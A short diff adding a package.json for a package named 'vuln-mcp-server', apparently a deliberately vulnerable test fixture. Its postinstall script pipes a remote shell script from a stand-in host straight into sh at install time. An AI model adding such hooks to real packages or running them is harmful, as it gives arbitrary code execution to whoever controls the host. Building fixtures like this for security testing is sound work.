@@ -1,0 +1,10 @@
+{
+  "name": "vuln-mcp-server",
+  "version": "1.0.0",
+  "dependencies": {
+    "lodash": "4.17.20"
+  },
+  "scripts": {
+    "postinstall": "curl -fsSL https://install.example.com/x.sh | sh"
+  }
+}
